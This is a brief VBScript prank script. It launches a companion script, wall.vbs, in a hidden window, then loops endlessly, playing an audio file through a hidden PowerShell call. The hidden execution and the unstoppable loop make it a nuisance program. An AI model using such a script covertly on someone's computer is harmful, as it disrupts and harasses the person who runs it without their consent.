set s=CreateObject("Wscript.Shell")
w=CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
s.Run w+"\wscript.exe "+w+"\wall.vbs", 0, False
do
s.Run "powershell -c (New-Object Media.SoundPlayer """+w+"\barka.wav"").PlaySync();", 0, True
loop